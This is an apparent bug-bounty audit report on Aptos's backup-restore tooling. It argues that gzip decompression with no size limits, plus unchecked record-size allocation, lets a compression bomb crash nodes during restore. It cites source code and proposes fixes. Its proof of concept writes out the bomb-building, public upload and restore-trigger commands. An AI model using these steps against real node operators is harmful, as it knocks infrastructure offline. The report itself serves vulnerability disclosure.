# Audit Report

## Title
Unprotected Gzip Decompression in Backup Restore Enables Compression Bomb DoS Attack

## Summary
The Aptos backup/restore system decompresses gzip-compressed backup files without size limits or decompression ratio checks, allowing attackers to inject compression bombs that cause memory exhaustion and node crashes during database restoration operations.

## Finding Description

The backup/restore system uses gzip compression for all backup data stored in cloud storage (S3, GCS, Azure). During restoration, backup files are decompressed without any protection against compression bombs.

**Vulnerable Decompression Flow:**

All three cloud storage backends execute unprotected `gzip -cd` commands during `open_for_read`: [1](#0-0) [2](#0-1) [3](#0-2) 

Production configurations also use the same vulnerable pattern: [4](#0-3) 

**Compounded by Unbounded Memory Allocation:**

After decompression, the system reads record bytes by first reading a 4-byte size header, then allocating a buffer of that size without validation: [5](#0-4) 

The `record_size` (line 54) is cast from u32 to usize and used directly to allocate memory via `BytesMut::with_capacity(record_size)` (line 60) without any upper bound checks.

**Attack Vector - Public Backup Sources:**

Nodes can restore from public backup sources, as evidenced by the `--no-sign-request` flag in configurations: [6](#0-5) 

The documentation confirms this use case: [7](#0-6) 

**Verification Occurs Too Late:**

Cryptographic verification (waypoints, signatures) happens AFTER decompression and memory allocation: [8](#0-7) [9](#0-8) 

**Attack Scenario:**

1. Attacker creates malicious backup files containing gzip compression bombs (e.g., 10MB compressed â†’ 100GB decompressed)
2. Attacker either:
   - Compromises a public backup bucket with write access
   - Hosts malicious backup and social engineers node operators to use it
   - Exploits misconfigured backup bucket permissions
3. Node operator initiates restore: `aptos-debugger aptos-db restore bootstrap-db --command-adapter-config malicious-backup.yaml`
4. During restore execution:
   - `open_for_read` pipes data through `gzip -cd` with no size limits
   - Decompression expands bomb to massive size (e.g., 100GB)
   - Memory exhaustion occurs before any cryptographic verification
   - Additional unbounded allocation from malicious size headers (up to 4GB per record)
5. Node process crashes or system OOM killer terminates it
6. Restore operation fails, node cannot bootstrap database

## Impact Explanation

**Severity: High**

This vulnerability meets the High severity criteria per Aptos bug bounty guidelines:

- **Validator node slowdowns**: Memory exhaustion during restore causes severe performance degradation
- **API crashes**: Restore process crashes due to OOM, preventing node bootstrapping
- **Significant protocol violations**: Breaks the Resource Limits invariant requiring all operations to respect memory constraints

While this doesn't directly affect consensus or lead to fund loss, it creates a significant operational security issue:

1. **Node Availability**: Prevents successful database restoration, blocking new nodes from joining
2. **Operational DoS**: Node operators attempting restore from compromised sources face repeated crashes
3. **Bootstrap Disruption**: Critical recovery operations (disaster recovery, hard fork scenarios) can be sabotaged

The attack doesn't require validator privileges and can target any node operator performing backup restoration.

## Likelihood Explanation

**Likelihood: Medium to High**

Factors increasing likelihood:
- Public backup sources are documented and supported use cases
- No authentication required (`--no-sign-request`) for public buckets
- Simple attack: standard gzip bombs (like 42.zip) can be adapted
- Operators may not verify backup source integrity before restore
- Emergency recovery scenarios increase pressure to restore quickly without full verification

Factors decreasing likelihood:
- Requires attacker to compromise backup storage or convince operators to use malicious source
- Most production deployments use private, access-controlled backup buckets
- Operators typically use backups from trusted sources
- Attack only affects restore operations, not normal node operations

However, the **documented support for public backup sources** and the simplicity of creating compression bombs make this a realistic attack vector, especially during network emergencies when operators might restore from less-trusted sources.

## Recommendation

**Immediate Mitigations:**

1. **Add decompression size limits to gzip commands:**

```yaml
# For GCS config
open_for_read: |
  TEMP=$(mktemp)
  trap "rm -f $TEMP" EXIT
  # ... existing retry logic ...
  gcloud storage cp "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" $TEMP 1>&2 || continue
  # Add size check before decompression
  COMPRESSED_SIZE=$(stat -f%z "$TEMP" 2>/dev/null || stat -c%s "$TEMP")
  MAX_DECOMPRESSED_SIZE=$((COMPRESSED_SIZE * 100))  # Allow max 100x expansion
  cat $TEMP | gzip -cd | head -c $MAX_DECOMPRESSED_SIZE
  exit
```

2. **Add size validation to `read_record_bytes`:**

```rust
// In read_record_bytes.rs
const MAX_RECORD_SIZE: usize = 256 * 1024 * 1024; // 256MB max per record

async fn read_record_bytes(&mut self) -> Result<Option<Bytes>> {
    let _timer = BACKUP_TIMER.timer_with(&["read_record_bytes"]);
    
    let mut size_buf = BytesMut::with_capacity(4);
    self.read_full_buf_or_none(&mut size_buf).await?;
    if size_buf.is_empty() {
        return Ok(None);
    }

    let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
    if record_size == 0 {
        return Ok(Some(Bytes::new()));
    }

    // ADD THIS CHECK:
    if record_size > MAX_RECORD_SIZE {
        bail!(
            "Record size {} exceeds maximum allowed size {}",
            record_size,
            MAX_RECORD_SIZE
        );
    }

    let mut record_buf = BytesMut::with_capacity(record_size);
    self.read_full_buf_or_none(&mut record_buf).await?;
    if record_buf.is_empty() {
        bail!("Hit EOF when reading record.")
    }

    Ok(Some(record_buf.freeze()))
}
```

3. **Use a streaming decompression library with built-in limits:**

Replace shell-based gzip with Rust's `flate2` crate with size tracking:

```rust
use flate2::read::GzDecoder;
use std::io::Read;

const MAX_DECOMPRESSION_RATIO: usize = 100;
const MAX_DECOMPRESSED_SIZE: usize = 10 * 1024 * 1024 * 1024; // 10GB

struct LimitedGzDecoder<R: Read> {
    decoder: GzDecoder<R>,
    bytes_read: usize,
    compressed_bytes: usize,
}

impl<R: Read> Read for LimitedGzDecoder<R> {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let n = self.decoder.read(buf)?;
        self.bytes_read += n;
        
        if self.bytes_read > MAX_DECOMPRESSED_SIZE {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Decompressed size exceeds maximum"
            ));
        }
        
        if self.compressed_bytes > 0 && 
           self.bytes_read / self.compressed_bytes > MAX_DECOMPRESSION_RATIO {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Decompression ratio exceeds maximum"
            ));
        }
        
        Ok(n)
    }
}
```

**Long-term Solutions:**

1. Implement backup integrity verification using cryptographic commitments in metadata
2. Add configurable size limits as command-line parameters
3. Monitor decompression operations with metrics and alerting
4. Document security best practices for backup source verification

## Proof of Concept

**Step 1: Create a Compression Bomb**

```bash
#!/bin/bash
# Create a 10GB file of zeros
dd if=/dev/zero bs=1M count=10240 | gzip -9 > compression_bomb.gz

# This creates a ~10MB gzip file that expands to 10GB
# Compression ratio: ~1000x
```

**Step 2: Create Malicious Backup Structure**

```bash
# Package as backup chunk
(
  # Add BCS size header (4 bytes) claiming 4GB record
  printf '\xff\xff\xff\xff'
  # Add the compressed bomb
  cat compression_bomb.gz
) > malicious_chunk.blob

# Upload to accessible storage
aws s3 cp malicious_chunk.blob s3://malicious-backup-bucket/backup1/state_snapshot_chunk_0 --acl public-read
```

**Step 3: Create Minimal Manifest**

```json
{
  "version": 1000000,
  "root_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
  "chunks": [
    {
      "first_idx": 0,
      "last_idx": 1,
      "first_key": "0x00",
      "last_key": "0xff",
      "blobs": "state_snapshot_chunk_0",
      "proof": "proof_0"
    }
  ]
}
```

**Step 4: Trigger Restore**

```bash
# Configure restore to use malicious backup
cat > malicious-s3.yaml <<EOF
env_vars:
  - key: "BUCKET"
    value: "malicious-backup-bucket"
  - key: "SUB_DIR"
    value: "backup1"
commands:
  open_for_read: 'aws s3 cp "s3://\$BUCKET/\$SUB_DIR/\$FILE_HANDLE" - --no-sign-request | gzip -cd'
  # ... other commands ...
EOF

# Attempt restore - this will cause memory exhaustion
aptos-debugger aptos-db restore bootstrap-db \
  --concurrent-downloads 1 \
  --target-db-dir /tmp/restore-test \
  --metadata-cache-dir /tmp/metadata-cache \
  --command-adapter-config malicious-s3.yaml

# Expected result: Process crashes with OOM or system kills it
# System logs will show memory exhaustion
```

**Expected Behavior:**
- Process memory grows rapidly to multi-GB
- System becomes unresponsive
- OOM killer terminates process OR process crashes
- Restore fails before any cryptographic verification occurs

## Notes

This vulnerability exists across all three supported cloud storage backends (GCS, S3, Azure) and affects both sample configurations and production Helm chart configurations. The issue is particularly concerning because the Aptos documentation explicitly supports restoring from public backup sources for disaster recovery scenarios, making this a realistic attack vector during network emergencies.

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/gcp.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    gsutil -q cp "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/s3.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/azure.sample.yaml (L23-26)
```yaml
  open_for_read: |
    # need to close stdin by "</dev/null" since azcopy gets confused about the direction of the pipe, even though we supply --from-to
    # route file handle content to stdout
    azcopy cp --from-to BlobPipe "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/$SUB_DIR/$FILE_HANDLE$SAS" < /dev/null | gzip -cd
```

**File:** terraform/helm/fullnode/files/backup/gcs.yaml (L9-24)
```yaml
  open_for_read: |
    TEMP=$(mktemp)
    trap "rm -f $TEMP" EXIT
    for try in {0..4}
    do
        if [ $try -gt 0 ]; then
            SLEEP=$((10 * $try))
            echo "sleeping for $SLEEP seconds before retry #$try" >&2
          sleep $SLEEP
        fi
      gcloud storage cp "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" $TEMP 1>&2 || continue
      cat $TEMP | gzip -cd
      exit
    done
    echo "Failed after 5 tries" >&2
    exit 1
```

**File:** storage/backup/backup-cli/src/utils/read_record_bytes.rs (L44-67)
```rust
    async fn read_record_bytes(&mut self) -> Result<Option<Bytes>> {
        let _timer = BACKUP_TIMER.timer_with(&["read_record_bytes"]);
        // read record size
        let mut size_buf = BytesMut::with_capacity(4);
        self.read_full_buf_or_none(&mut size_buf).await?;
        if size_buf.is_empty() {
            return Ok(None);
        }

        // empty record
        let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
        if record_size == 0 {
            return Ok(Some(Bytes::new()));
        }

        // read record
        let mut record_buf = BytesMut::with_capacity(record_size);
        self.read_full_buf_or_none(&mut record_buf).await?;
        if record_buf.is_empty() {
            bail!("Hit EOF when reading record.")
        }

        Ok(Some(record_buf.freeze()))
    }
```

**File:** docker/compose/data-restore/s3.yaml (L1-20)
```yaml
env_vars:
  - key: "BUCKET"
    value: "aptos-ait3-data/backups"
  - key: "SUB_DIR"
    value: "e4"
commands:
  create_backup: echo "$BACKUP_NAME"
  create_for_write: |
    FILE_HANDLE="$BACKUP_HANDLE/$FILE_NAME"
    echo "$FILE_HANDLE"
    exec 1>&-
    gzip -c | aws s3 cp - "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE"
  open_for_read: 'aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - --no-sign-request | gzip -cd'
  save_metadata_line: |
    FILE_HANDLE="metadata/$FILE_NAME"
    echo "$FILE_HANDLE"
    exec 1>&-
    gzip -c | aws s3 cp - "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" --no-sign-request
  list_metadata_files: '(aws s3 ls s3://$BUCKET/$SUB_DIR/metadata/ --no-sign-request ||:) | sed -ne "s#.* \(.*\)#metadata/\1#p"'
  backup_metadata_file: 'aws s3 mv s3://$BUCKET/$SUB_DIR/metadata/$FILE_NAME s3://$BUCKET/$SUB_DIR/metadata_backup/$FILE_NAME --no-progress --no-sign-request'
```

**File:** storage/README.md (L15-21)
```markdown
* the backup system which persists the entire history of transactions. The
backups are not required for running the blockchain in normal situations, but
can be critical when emergency happens were an AptosDB needs to be recreated
a. without the help of widely available healthy running Aptos Nodes b. to
recover a historical state back in time. c. specifically, to do b. in order to
create an alternative ledger and redistribute the result to overcome
unforeseeable catastrophic situations (to hard fork)
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L253-266)
```rust
    async fn read_state_value(
        storage: &Arc<dyn BackupStorage>,
        file_handle: FileHandle,
    ) -> Result<Vec<(StateKey, StateValue)>> {
        let mut file = storage.open_for_read(&file_handle).await?;

        let mut chunk = vec![];

        while let Some(record_bytes) = file.read_record_bytes().await? {
            chunk.push(bcs::from_bytes(&record_bytes)?);
        }

        Ok(chunk)
    }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L160-172)
```rust
    async fn read_chunk(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Vec<LedgerInfoWithSignatures>> {
        let mut file = self.storage.open_for_read(file_handle).await?;
        let mut chunk = vec![];

        while let Some(record_bytes) = file.read_record_bytes().await? {
            chunk.push(bcs::from_bytes(&record_bytes)?);
        }

        Ok(chunk)
    }
```
